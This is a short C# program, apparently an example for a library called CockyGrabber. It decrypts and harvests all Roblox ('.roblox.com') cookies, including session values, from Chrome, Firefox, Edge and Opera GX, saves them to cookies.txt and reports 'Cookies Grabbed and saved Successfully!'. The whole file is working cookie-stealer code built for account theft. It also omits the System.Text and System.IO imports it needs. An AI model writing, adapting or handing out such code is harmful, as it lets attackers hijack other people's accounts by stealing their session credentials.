using CockyGrabber;
using System;
namespace GrabberExamples
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder robloxCookies = new StringBuilder();
            
            ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
            if (cg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".roblox.com", cg.GetKey()))
                {
                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (fg.CookiesExists())
            {
                foreach (var item in fg.GetCookiesByHostname(".roblox.com"))
                {
                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (eg.CookiesExists())
            {
                foreach (var item in eg.GetCookiesByHostname(".roblox.com", eg.GetKey()))
                {
                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (og.CookiesExists())
            {
                foreach (var item in og.GetCookiesByHostname(".roblox.com", og.GetKey()))
                {
                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            
            
            File.WriteAllText("cookies.txt", robloxCookies.ToString());
            Console.WriteLine("Cookies Grabbed and saved Successfully!");
            Console.ReadKey();
        }
    }
}
